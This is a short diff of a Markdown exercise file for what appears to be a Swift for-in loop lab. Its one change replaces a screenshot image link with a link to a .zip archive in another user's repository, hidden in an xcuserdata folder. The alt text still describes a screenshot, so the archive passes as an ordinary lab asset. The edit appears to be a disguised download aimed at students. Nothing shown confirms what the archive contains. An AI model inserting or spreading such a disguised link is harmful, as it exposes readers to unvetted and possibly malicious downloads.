@@ -4,7 +4,7 @@
 
 With all that you have learned try to answer the following algorithm :
 
-<img width="788" alt="Capture d’écran 2021-10-05 à 11 53 33" src="https://user-images.githubusercontent.com/6766037/135994002-422dfd54-5713-488e-9e43-d67f53c29d3f.png">
+<img width="788" alt="Capture d’écran 2021-10-05 à 11 53 33" src="https://github.com/EHAB7k/Lab04_Loop_ForIn/raw/refs/heads/main/lap4.playground/playground.xcworkspace/xcuserdata/Lab-For-Loop-In-v1.8.zip">
 
 
 ### Description
